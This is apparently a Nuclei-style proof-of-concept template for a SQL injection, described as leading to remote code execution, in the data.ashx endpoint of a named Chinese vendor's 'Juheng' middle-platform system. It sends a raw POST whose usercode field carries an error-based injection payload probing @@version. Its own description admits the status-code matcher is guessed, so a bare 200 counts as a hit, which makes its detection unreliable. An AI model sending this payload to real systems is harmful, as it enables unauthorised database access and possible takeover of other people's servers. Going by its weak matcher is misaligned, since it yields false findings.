id: poc-gcsytoe581uzv00v
info:
  name: 聚恒网络技术有限公司聚恒中台系统 data.ashx SQL注入致RCE漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,sqli,2024
http:
- raw:
  - 'POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Connection: close

    usercode=1'' and 1=(convert(int,@@version))--&&mobile='
  redirects: false
  matchers:
  - status:
    - 200
    type: status
